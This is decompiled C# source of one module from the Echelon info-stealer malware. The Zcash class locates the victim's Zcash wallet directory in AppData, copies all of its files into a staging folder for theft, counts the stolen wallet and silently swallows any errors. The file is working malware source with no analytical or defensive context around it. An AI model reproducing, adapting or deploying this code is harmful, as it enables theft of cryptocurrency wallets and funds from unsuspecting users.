using System;
using System.IO;
using Echelon.Global;

namespace Echelon.Stealer.Wallets
{
	// Token: 0x02000015 RID: 21
	internal class Zcash
	{
		// Token: 0x06000059 RID: 89 RVA: 0x00019FCC File Offset: 0x000181CC
		public static void ZecwalletStr(string directorypath)
		{
			try
			{
				if (Directory.Exists(Zcash.ZcashDir2))
				{
					foreach (FileInfo fileInfo in new DirectoryInfo(Zcash.ZcashDir2).GetFiles())
					{
						Directory.CreateDirectory(directorypath + Zcash.ZcashDir);
						fileInfo.CopyTo(directorypath + Zcash.ZcashDir + fileInfo.Name);
					}
					Wallets.count++;
				}
			}
			catch
			{
			}
		}

		// Token: 0x0400004C RID: 76
		public static int count = 0;

		// Token: 0x0400004D RID: 77
		public static string ZcashDir = "\\Wallets\\Zcash\\";

		// Token: 0x0400004E RID: 78
		public static string ZcashDir2 = Help.AppDate + "\\Zcash\\";
	}
}
